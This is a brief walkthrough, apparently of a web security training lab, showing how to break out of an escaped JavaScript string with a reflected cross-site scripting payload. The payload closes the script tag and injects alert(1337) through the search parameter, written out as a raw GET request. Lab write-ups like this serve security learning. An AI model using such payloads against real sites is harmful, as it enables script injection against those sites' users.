Reflected XSS into a JavaScript string with single quote and backslash escaped

After intercepting the request, replace the search word with </script><script>alert(1337)</script> and forward the request. This should trigger the XSS.
If the lab doesn't get completed right away, try searching for a random string after triggering the XSS.

Request:

GET /?search=</script><script>alert(1337)</script> HTTP/1.1
